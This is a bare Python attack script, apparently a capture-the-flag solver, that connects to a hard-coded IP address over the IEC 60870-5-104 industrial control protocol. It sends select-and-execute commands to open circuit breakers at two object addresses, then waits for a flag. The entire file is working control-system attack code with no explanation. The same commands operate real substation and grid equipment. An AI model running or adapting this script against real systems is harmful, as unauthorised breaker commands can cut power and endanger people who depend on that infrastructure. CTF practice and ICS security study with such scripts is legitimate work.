#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        s.connect((HOST, PORT))
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex())
        ca = bytes([0x01, 0x00])
        tx = 0
        rx = 0
        def send_i(asdu):
            nonlocal tx, rx
            apci = bytes([0x68, len(asdu)+4, tx&0xFF, (tx>>8)&0xFF, rx&0xFF, (rx>>8)&0xFF])
            tx += 2
            rx += 2
            s.send(apci + asdu)
        # Try to OPEN breaker - SCS = 0 (off/open)? 
        for ioa_num in [1, 2]:
            ioa = bytes([ioa_num & 0xFF, (ioa_num>>8)&0xFF, (ioa_num>>16)&0xFF])
            # select with SCS=0 (open/off)
            asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x00]) # select, SCS=0
            send_i(asdu)
            time.sleep(1)
            try:
                print(s.recv(256).hex())
            except:
                pass
            # operate with SCS=0
            asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x80]) # execute, SCS=0
            send_i(asdu)
            time.sleep(1)
            try:
                print(s.recv(256).hex())
            except:
                pass
        print('waiting long...')
        start = time.time()
        while time.time() - start < 200:
            try:
                s.settimeout(20)
                r = s.recv(8192)
                if not r: break
                print('DATA:', r.hex())
                if b'CTF{' in r:
                    print(r)
                    break
            except socket.timeout:
                try:
                    s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except: break
                continue
            except Exception as e:
                print(e)
                break
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
